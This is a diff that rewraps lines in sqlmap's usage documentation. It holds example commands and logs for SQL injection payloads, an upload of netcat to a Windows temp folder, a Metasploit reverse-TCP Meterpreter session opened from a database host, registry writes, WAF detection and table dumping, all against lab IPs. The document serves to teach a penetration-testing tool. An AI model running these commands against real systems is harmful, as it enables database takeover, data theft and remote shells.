-    distinct queries to be able to retrieve the output even if we are going blind
-    [hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) AS VARCHAR(8000)), 
-    (CHAR(32)))
+    [hh:mm:50] [INFO] the SQL query provided has more than a field. sqlmap will now unpa
+    ck it into distinct queries to be able to retrieve the output even if we are going b
+    lind
+    [hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) AS VARC
+    HAR(8000)), (CHAR(32)))
     [hh:mm:50] [INFO] retrieved: foo
     [hh:mm:50] [DEBUG] performed 27 queries in 0 seconds
-    [hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(98)+CHAR(97)+CHAR(114)) AS VARCHAR(8000)), 
-    (CHAR(32)))
+    [hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(98)+CHAR(97)+CHAR(114)) AS VARCHA
+    R(8000)), (CHAR(32)))
     [hh:mm:50] [INFO] retrieved: bar
     [hh:mm:50] [DEBUG] performed 27 queries in 0 seconds
     SELECT 'foo', 'bar':    'foo, bar'
@@ -1278,7 +1319,8 @@ Example against a MySQL 4.1 target:
     back-end DBMS: MySQL < 5.0.0
     banner:    '4.1.21-community-nt'
 
-    [hh:mm:40] [INFO] checking table existence using items from '/software/sqlmap/txt/common-tables.txt'
+    [hh:mm:40] [INFO] checking table existence using items from '/software/sqlmap/txt/co
+    mmon-tables.txt'
     [hh:mm:40] [INFO] adding words used on web page to the check list
     please enter number of threads? [Enter for 1 (current)] 8
     [hh:mm:43] [INFO] retrieved: users
@@ -1371,8 +1413,8 @@ Example against a MySQL target to upload a binary UPX-compressed file:
     $ ls -l /software/nc.exe.packed
     -rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /software/nc.exe.packed
 
-    $ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1" --file-write \
-    "/software/nc.exe.packed" --file-dest "C:/WINDOWS/Temp/nc.exe" -v 1
+    $ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1" --file
+    -write "/software/nc.exe.packed" --file-dest "C:/WINDOWS/Temp/nc.exe" -v 1
 
     [...]
     [hh:mm:29] [INFO] the back-end DBMS is MySQL
@@ -1457,8 +1499,8 @@ slide deck [Expanding the control over the operating system from the database](h
 
 Example against a MySQL target:
 
-    $ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?id=1" --os-pwn \
-    --msf-path /software/metasploit
+    $ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?id=1"
+    --os-pwn --msf-path /software/metasploit
 
     [...]
     [hh:mm:31] [INFO] the back-end DBMS is MySQL
@@ -1483,15 +1525,16 @@ Example against a MySQL target:
     [hh:mm:33] [INFO] retrieving MySQL base directory absolute path
     [hh:mm:34] [INFO] creating UDF 'sys_bineval' from the binary UDF file
     [hh:mm:34] [INFO] creating UDF 'sys_exec' from the binary UDF file
-    how do you want to execute the Metasploit shellcode on the back-end database underlying 
-    operating system?
+    how do you want to execute the Metasploit shellcode on the back-end database underly
+    ing operating system?
     [1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)
     [2] Stand-alone payload stager (file system way)
     > 
     [hh:mm:35] [INFO] creating Metasploit Framework multi-stage shellcode 
     which connection type do you want to use?
     [1] Reverse TCP: Connect back from the database host to this machine (default)
-    [2] Reverse TCP: Try to connect back from the database host to this machine, on all ports 
+    [2] Reverse TCP: Try to connect back from the database host to this machine, on all 
+    ports 
     between the specified and 65535
     [3] Bind TCP: Listen on the database host for a connection
     > 
@@ -1503,7 +1546,8 @@ Example against a MySQL target:
     [3] VNC
     > 
     [hh:mm:40] [INFO] creation in progress ... done
-    [hh:mm:43] [INFO] running Metasploit Framework command line interface locally, please wait..
+    [hh:mm:43] [INFO] running Metasploit Framework command line interface locally, pleas
+    e wait..
 
                                     _
                                     | |      o
@@ -1525,11 +1569,11 @@ Example against a MySQL target:
     LHOST => 192.168.136.1
     [*] Started reverse handler on 192.168.136.1:60641 
     [*] Starting the payload handler...
-    [hh:mm:48] [INFO] running Metasploit Framework shellcode remotely via UDF 'sys_bineval', 
-    please wait..
+    [hh:mm:48] [INFO] running Metasploit Framework shellcode remotely via UDF 'sys_binev
+    al', please wait..
     [*] Sending stage (749056 bytes) to 192.168.136.129
-    [*] Meterpreter session 1 opened (192.168.136.1:60641 -> 192.168.136.129:1689) at Mon Apr 11 
-    hh:mm:52 +0100 2011
+    [*] Meterpreter session 1 opened (192.168.136.1:60641 -> 192.168.136.129:1689) at Mo
+    n Apr 11 hh:mm:52 +0100 2011
 
     meterpreter > Loading extension espia...success.
     meterpreter > Loading extension incognito...success.
@@ -1596,8 +1640,9 @@ With `--reg-key` option you specify used Windows registry key path, with `--reg-
 
 A sample command line for adding a registry key hive follows:
 
-    $ python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1 --reg-add \ 
-    --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap" --reg-value=Test --reg-type=REG_SZ --reg-data=1
+    $ python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1 --reg-a\
+    dd --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap" --reg-value=Test --reg-type=REG_S\
+    Z --reg-data=1
 
 ## General
 
@@ -1675,7 +1720,8 @@ It is possible to calculate and show in real time the estimated time of arrival 
 
 Example against an Oracle target affected only by boolean-based blind SQL injection:
 
-    $ python sqlmap.py -u "http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1" -b --eta
+    $ python sqlmap.py -u "http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1" \
+    -b --eta
 
     [...]
     [hh:mm:01] [INFO] the back-end DBMS is Oracle
@@ -1687,7 +1733,8 @@ Example against an Oracle target affected only by boolean-based blind SQL inject
 Then:
 
     100% [===================================================] 64/64
-    [hh:mm:53] [INFO] retrieved: Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod
+    [hh:mm:53] [INFO] retrieved: Oracle Database 10g Enterprise Edition Release 10.2.0.1
+    .0 - Prod
 
     web application technology: PHP 5.2.6, Apache 2.2.9
     back-end DBMS: Oracle
@@ -1725,12 +1772,21 @@ In lost of cases retrieval of non-ASCII data requires special needs. One solutio
 
 Example against a PostgreSQL target:
 
-    $ python sqlmap.py -u "http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1" --banner --hex -v 3 --parse-errors
+    $ python sqlmap.py -u "http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1" --banne\
+    r --hex -v 3 --parse-errors
 
     [...]
     [xx:xx:14] [INFO] fetching banner
-    [xx:xx:14] [PAYLOAD] 1 AND 5849=CAST((CHR(58)||CHR(118)||CHR(116)||CHR(106)||CHR(58))||(ENCODE(CONVERT_TO((COALESCE(CAST(VERSION() AS CHARACTER(10000)),(CHR(32)))),(CHR(85)||CHR(84)||CHR(70)||CHR(56))),(CHR(72)||CHR(69)||CHR(88))))::text||(CHR(58)||CHR(110)||CHR(120)||CHR(98)||CHR(58)) AS NUMERIC)
-    [xx:xx:15] [INFO] parsed error message: 'pg_query() [<a href='function.pg-query'>function.pg-query</a>]: Query failed: ERROR:  invalid input syntax for type numeric: ":vtj:506f737467726553514c20382e332e39206f6e20693438362d70632d6c696e75782d676e752c20636f6d70696c656420627920474343206763632d342e332e7265616c202844656269616e2032e332e322d312e312920342e332e32:nxb:" in <b>/var/www/sqlmap/libs/pgsql.inc.php</b> on line <b>35</b>'
+    [xx:xx:14] [PAYLOAD] 1 AND 5849=CAST((CHR(58)||CHR(118)||CHR(116)||CHR(106)||CHR(58)
+    )||(ENCODE(CONVERT_TO((COALESCE(CAST(VERSION() AS CHARACTER(10000)),(CHR(32)))),(CHR
+    (85)||CHR(84)||CHR(70)||CHR(56))),(CHR(72)||CHR(69)||CHR(88))))::text||(CHR(58)||CHR
+    (110)||CHR(120)||CHR(98)||CHR(58)) AS NUMERIC)
+    [xx:xx:15] [INFO] parsed error message: 'pg_query() [<a href='function.pg-query'>fun
+    ction.pg-query</a>]: Query failed: ERROR:  invalid input syntax for type numeric: ":
+    vtj:506f737467726553514c20382e332e39206f6e20693438362d70632d6c696e75782d676e752c2063
+    6f6d70696c656420627920474343206763632d342e332e7265616c202844656269616e2032e332e322d3
+    12e312920342e332e32:nxb:" in <b>/var/www/sqlmap/libs/pgsql.inc.php</b> on line <b>35
+    </b>'
     [xx:xx:15] [INFO] retrieved: PostgreSQL 8.3.9 on i486-pc-linux-gnu, compiled by
     GCC gcc-4.3.real (Debian 4.3.2-1.1) 4.3.2
     [...]
@@ -1751,17 +1807,26 @@ This is useful for debugging purposes like understanding why a certain enumerati
 
 Example against a Microsoft SQL Server target:
 
-    $ python sqlmap.py -u "http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1" --parse-errors
+    $ python sqlmap.py -u "http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1" --p\
+    arse-errors
     [...]
-    [xx:xx:17] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
-    [xx:xx:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)
-    [Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 10 is out of range of the number of items in the select list.
+    [xx:xx:17] [INFO] ORDER BY technique seems to be usable. This should reduce the time
+    needed to find the right number of query columns. Automatically extending the range
+    for current UNION query injection technique test
+    [xx:xx:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Drivers 
+    (0x80040E14)
+    [Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 10 is ou
+    t of range of the number of items in the select list.
     <b>/sqlmap/mssql/iis/get_int.asp, line 27</b>'
-    [xx:xx:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)
-    [Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 6 is out of range of the number of items in the select list.
+    [xx:xx:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Drivers 
+    (0x80040E14)
+    [Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 6 is out
+    of range of the number of items in the select list.
     <b>/sqlmap/mssql/iis/get_int.asp, line 27</b>'
-    [xx:xx:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)
-    [Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 4 is out of range of the number of items in the select list.
+    [xx:xx:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Drivers 
+    (0x80040E14)
+    [Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 4 is out
+    of range of the number of items in the select list.
     <b>/sqlmap/mssql/iis/get_int.asp, line 27</b>'
     [xx:xx:17] [INFO] target URL appears to have 3 columns in query
     [...]
@@ -1802,19 +1867,22 @@ Each option and switch can be written in a shorter mnemonic form using option `-
 
 Example:
 
-    python sqlmap.py --batch --random-agent --ignore-proxy --technique=BEU -u "www.target.com/vuln.php?id=1"
+    $ python sqlmap.py --batch --random-agent --ignore-proxy --technique=BEU -u "www.ta\
+    rget.com/vuln.php?id=1"
 
 can be written (one of many ways) in shorter mnemonic form like:
 
-    python sqlmap.py -z "bat,randoma,ign,tec=BEU" -u "www.target.com/vuln.php?id=1"
+    $ python sqlmap.py -z "bat,randoma,ign,tec=BEU" -u "www.target.com/vuln.php?id=1"
 
 Another example:
 
-    python sqlmap.py --ignore-proxy --flush-session --technique=U --dump -D testdb -T users -u "www.target.com/vuln.php?id=1"
+    $ python sqlmap.py --ignore-proxy --flush-session --technique=U --dump -D testdb -T\
+    users -u "www.target.com/vuln.php?id=1"
 
 can be written in shorter mnemonic form like:
 
-    python sqlmap.py -z "ign,flu,bat,tec=U,dump,D=testdb,T=users" -u "www.target.com/vuln.php?id=1"
+    $ python sqlmap.py -z "ign,flu,bat,tec=U,dump,D=testdb,T=users" -u "www.target.com/\
+    vuln.php?id=1"
 
 ### Alerting on successful SQL injection detection
 
@@ -1828,11 +1896,14 @@ In case that user wants to automatically set up answers for questions, even if `
 
 Example against a MySQL target:
 
-    $ python sqlmap.py -u "http://192.168.22.128/sqlmap/mysql/get_int.php?id=1"--technique=E --answers="extending=N" --batch
+    $ python sqlmap.py -u "http://192.168.22.128/sqlmap/mysql/get_int.php?id=1"--techni\
+    que=E --answers="extending=N" --batch
     [...]
     [xx:xx:56] [INFO] testing for SQL injection on GET parameter 'id'
-    heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
-    [xx:xx:56] [INFO] do you want to include all tests for 'MySQL' extending provided level (1) and risk (1)? [Y/n] N
+    heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you want
+    to skip test payloads specific for other DBMSes? [Y/n] Y
+    [xx:xx:56] [INFO] do you want to include all tests for 'MySQL' extending provided le
+    vel (1) and risk (1)? [Y/n] N
     [...]
 
 ### Make a beep sound when SQL injection is found
@@ -1885,33 +1956,50 @@ sqlmap can try to identify backend WAF/IPS/IDS protection (if any) so user could
 
 Example against a MySQL target protected by the ModSecurity WAF:
 
-    $ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" --identify-waf -v 3
+    $ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" --ident\
+    ify-waf -v 3
     [...]
     [xx:xx:23] [INFO] testing connection to the target URL
     [xx:xx:23] [INFO] heuristics detected web page charset 'ascii'
     [xx:xx:23] [INFO] using WAF scripts to detect backend WAF/IPS/IDS protection
-    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'USP Secure Entry Server (United Security Providers)'
-    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'BinarySEC Web Application Firewall (BinarySEC)'
-    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'NetContinuum Web Application Firewall (NetContinuum/Barracuda Networks)'
-    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Hyperguard Web Application Firewall (art of defence Inc.)'
-    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Cisco ACE XML Gateway (Cisco Systems)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'USP Secure Entry Server (United
+    Security Providers)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'BinarySEC Web Application Firew
+    all (BinarySEC)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'NetContinuum Web Application Fi
+    rewall (NetContinuum/Barracuda Networks)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Hyperguard Web Application Fire
+    wall (art of defence Inc.)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Cisco ACE XML Gateway (Cisco Sy
+    stems)'
     [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'TrafficShield (F5 Networks)'
-    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Teros/Citrix Application Firewall Enterprise (Teros/Citrix Systems)'
-    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'KONA Security Solutions (Akamai Technologies)'
-    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Incapsula Web Application Firewall (Incapsula/Imperva)'
-    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'CloudFlare Web Application Firewall (CloudFlare)'
-    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Barracuda Web Application Firewall (Barracuda Networks)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Teros/Citrix Application Firewa
+    ll Enterprise (Teros/Citrix Systems)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'KONA Security Solutions (Akamai
+    Technologies)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Incapsula Web Application Firew
+    all (Incapsula/Imperva)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'CloudFlare Web Application Fire
+    wall (CloudFlare)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Barracuda Web Application Firew
+    all (Barracuda Networks)'
     [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'webApp.secure (webScurity)'
-    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Proventia Web Application Security (IBM)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Proventia Web Application Secur
+    ity (IBM)'
     [xx:xx:23] [DEBUG] declared web page charset 'iso-8859-1'
     [xx:xx:23] [DEBUG] page not found (404)
     [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'KS-WAF (Knownsec)'
     [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'NetScaler (Citrix Systems)'
-    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Jiasule Web Application Firewall (Jiasule)'
-    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'WebKnight Application Firewall (AQTRONIX)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Jiasule Web Application Firewal
+    l (Jiasule)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'WebKnight Application Firewall 
+    (AQTRONIX)'
     [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'AppWall (Radware)'
-    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'ModSecurity: Open Source Web Application Firewall (Trustwave)'
-    [xx:xx:23] [CRITICAL] WAF/IDS/IPS identified 'ModSecurity: Open Source Web Application Firewall (Trustwave)'. Please consider usage of tamper scripts (option '--tamper')
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'ModSecurity: Open Source Web Ap
+    plication Firewall (Trustwave)'
+    [xx:xx:23] [CRITICAL] WAF/IDS/IPS identified 'ModSecurity: Open Source Web Applicati
+    on Firewall (Trustwave)'. Please consider usage of tamper scripts (option '--tamper'
+    )
     [...]
 
 ### Imitate smartphone
@@ -1968,38 +2056,51 @@ There are cases when user has a large list of potential target URLs (e.g. provid
 
 Example against a MySQL target:
 
-    $ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&user=foo&id=1" --batch --smart
+    $ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&user=fo\
+    o&id=1" --batch --smart
     [...]
     [xx:xx:14] [INFO] testing if GET parameter 'ca' is dynamic
     [xx:xx:14] [WARNING] GET parameter 'ca' does not appear dynamic
-    [xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter 'ca' might not be injectable
+    [xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter 'ca' might not 
+    be injectable
     [xx:xx:14] [INFO] skipping GET parameter 'ca'
     [xx:xx:14] [INFO] testing if GET parameter 'user' is dynamic
     [xx:xx:14] [WARNING] GET parameter 'user' does not appear dynamic
-    [xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter 'user' might not be injectable
+    [xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter 'user' might no
+    t be injectable
     [xx:xx:14] [INFO] skipping GET parameter 'user'
     [xx:xx:14] [INFO] testing if GET parameter 'id' is dynamic
     [xx:xx:14] [INFO] confirming that GET parameter 'id' is dynamic
     [xx:xx:14] [INFO] GET parameter 'id' is dynamic
     [xx:xx:14] [WARNING] reflective value(s) found and filtering out
-    [xx:xx:14] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+    [xx:xx:14] [INFO] heuristic (basic) test shows that GET parameter 'id' might be inje
+    ctable (possible DBMS: 'MySQL')
     [xx:xx:14] [INFO] testing for SQL injection on GET parameter 'id'
-    heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
-    do you want to include all tests for 'MySQL' extending provided level (1) and risk (1)? [Y/n] Y
+    heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you want
+    to skip test payloads specific for other DBMSes? [Y/n] Y
+    do you want to include all tests for 'MySQL' extending provided level (1) and risk (
+    1)? [Y/n] Y
     [xx:xx:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
-    [xx:xx:14] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVING clause' injectable 
+    [xx:xx:14] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVING c
+    lause' injectable 
     [xx:xx:14] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'
-    [xx:xx:14] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause' injectable 
+    [xx:xx:14] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE or HAV
+    ING clause' injectable 
     [xx:xx:14] [INFO] testing 'MySQL inline queries'
     [xx:xx:14] [INFO] testing 'MySQL > 5.0.11 stacked queries'
     [xx:xx:14] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
     [xx:xx:14] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'
-    [xx:xx:24] [INFO] GET parameter 'id' is 'MySQL > 5.0.11 AND time-based blind' injectable 
+    [xx:xx:24] [INFO] GET parameter 'id' is 'MySQL > 5.0.11 AND time-based blind' inject
+    able 
     [xx:xx:24] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
-    [xx:xx:24] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other potential injection technique found
-    [xx:xx:24] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+    [xx:xx:24] [INFO] automatically extending ranges for UNION query injection technique
+    tests as there is at least one other potential injection technique found
+    [xx:xx:24] [INFO] ORDER BY technique seems to be usable. This should reduce the time
+    needed to find the right number of query columns. Automatically extending the range
+    for current UNION query injection technique test
     [xx:xx:24] [INFO] target URL appears to have 3 columns in query
-    [xx:xx:24] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
+    [xx:xx:24] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns'
+    injectable
     [...]
 
 ### Select tests by payloads and/or titles
@@ -2010,22 +2111,28 @@ In case that you want to filter tests by their payloads and/or titles you can us
 
 Example against a MySQL target:
 
-    $ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" --batch --test-filter=ROW
+    $ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" --batch\
+    --test-filter=ROW
     [...]
     [xx:xx:39] [INFO] GET parameter 'id' is dynamic
     [xx:xx:39] [WARNING] reflective value(s) found and filtering out
-    [xx:xx:39] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+    [xx:xx:39] [INFO] heuristic (basic) test shows that GET parameter 'id' might be inje
+    ctable (possible DBMS: 'MySQL')
     [xx:xx:39] [INFO] testing for SQL injection on GET parameter 'id'
     [xx:xx:39] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE or HAVING clause'
-    [xx:xx:39] [INFO] GET parameter 'id' is 'MySQL >= 4.1 AND error-based - WHERE or HAVING clause' injectable 
-    GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+    [xx:xx:39] [INFO] GET parameter 'id' is 'MySQL >= 4.1 AND error-based - WHERE or HAV
+    ING clause' injectable 
+    GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [
+    y/N] N
     sqlmap identified the following injection points with a total of 3 HTTP(s) requests:
     ---
     Place: GET
     Parameter: id
         Type: error-based
         Title: MySQL >= 4.1 AND error-based - WHERE or HAVING clause
-        Payload: id=1 AND ROW(4959,4971)>(SELECT COUNT(*),CONCAT(0x3a6d70623a,(SELECT (CASE WHEN (4959=4959) THEN 1 ELSE 0 END)),0x3a6b7a653a,FLOOR(RAND(0)*2))x FROM (SELECT 4706 UNION SELECT 3536 UNION SELECT 7442 UNION SELECT 3470)a GROUP BY x)
+        Payload: id=1 AND ROW(4959,4971)>(SELECT COUNT(*),CONCAT(0x3a6d70623a,(SELECT (C
+        ASE WHEN (4959=4959) THEN 1 ELSE 0 END)),0x3a6b7a653a,FLOOR(RAND(0)*2))x FROM (S
+        ELECT 4706 UNION SELECT 3536 UNION SELECT 7442 UNION SELECT 3470)a GROUP BY x)
     ---
     [...]
 
@@ -2042,11 +2149,15 @@ Example against a Microsoft SQL Server target:
         sqlmap/1.0-dev-2defc30 - automatic SQL injection and database takeover tool
         http://sqlmap.org
 
-    [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+    [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual con
+    sent is illegal. It is the end user's responsibility to obey all applicable local, s
+    tate and federal laws. Developers assume no liability and are not responsible for an
+    y misuse or damage caused by this program
 
-    [*] starting at 11:25:26
+    [*] starting at xx:xx:26
 
-    Please enter full target URL (-u): http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1
+    Please enter full target URL (-u): http://192.168.21.129/sqlmap/mssql/iis/get_int.as
+    p?id=1
     POST data (--data) [Enter for None]: 
     Injection difficulty (--level/--risk). Please choose:
     [1] Normal (default)
@@ -2061,10 +2172,14 @@ Example against a Microsoft SQL Server target:
 
     sqlmap is running, please wait..
 
-    heuristic (parsing) test showed that the back-end DBMS could be 'Microsoft SQL Server'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
-    do you want to include all tests for 'Microsoft SQL Server' extending provided level (1) and risk (1)? [Y/n] Y
-    GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
-    sqlmap identified the following injection points with a total of 25 HTTP(s) requests:
+    heuristic (parsing) test showed that the back-end DBMS could be 'Microsoft SQL Serve
+    r'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+    do you want to include all tests for 'Microsoft SQL Server' extending provided level
+    (1) and risk (1)? [Y/n] Y
+    GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [
+    y/N] N
+    sqlmap identified the following injection points with a total of 25 HTTP(s) requests
+    :
     ---
     Place: GET
     Parameter: id
@@ -2074,11 +2189,15 @@ Example against a Microsoft SQL Server target:
 
         Type: error-based
         Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause
-        Payload: id=1 AND 4847=CONVERT(INT,(CHAR(58) CHAR(118) CHAR(114) CHAR(100) CHAR(58) (SELECT (CASE WHEN (4847=4847) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(111) CHAR(109) CHAR(113) CHAR(58)))
+        Payload: id=1 AND 4847=CONVERT(INT,(CHAR(58)+CHAR(118)+CHAR(114)+CHAR(100)+CHAR(
+    58)+(SELECT (CASE WHEN (4847=4847) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(1
+    11)+CHAR(109)+CHAR(113)+CHAR(58)))
 
         Type: UNION query
         Title: Generic UNION query (NULL) - 3 columns
-        Payload: id=1 UNION ALL SELECT NULL,NULL,CHAR(58) CHAR(118) CHAR(114) CHAR(100) CHAR(58) CHAR(70) CHAR(79) CHAR(118) CHAR(106) CHAR(87) CHAR(101) CHAR(119) CHAR(115) CHAR(114) CHAR(77) CHAR(58) CHAR(111) CHAR(109) CHAR(113) CHAR(58)-- 
+        Payload: id=1 UNION ALL SELECT NULL,NULL,CHAR(58)+CHAR(118)+CHAR(114)+CHAR(100) 
+    CHAR(58)+CHAR(70)+CHAR(79)+CHAR(118)+CHAR(106)+CHAR(87)+CHAR(101)+CHAR(119)+CHAR(115
+    )+CHAR(114)+CHAR(77)+CHAR(58)+CHAR(111)+CHAR(109)+CHAR(113)+CHAR(58)-- 
 
         Type: stacked queries
         Title: Microsoft SQL Server/Sybase stacked queries
@@ -2090,7 +2209,9 @@ Example against a Microsoft SQL Server target:
 
         Type: inline query
         Title: Microsoft SQL Server/Sybase inline queries
-        Payload: id=(SELECT CHAR(58) CHAR(118) CHAR(114) CHAR(100) CHAR(58) (SELECT (CASE WHEN (6382=6382) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(111) CHAR(109) CHAR(113) CHAR(58))
+        Payload: id=(SELECT CHAR(58)+CHAR(118)+CHAR(114)+CHAR(100)+CHAR(58)+(SELECT (CAS
+    E WHEN (6382=6382) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(111)+CHAR(109)+CH
+    AR(113)+CHAR(58))
     ---
     web server operating system: Windows XP
     web application technology: ASP, Microsoft IIS 5.1
@@ -2107,4 +2228,4 @@ Example against a Microsoft SQL Server target:
     current database:    'testdb'
     current user is DBA:    True
 
-    [*] shutting down at 11:25:52
+    [*] shutting down at xx:xx:52
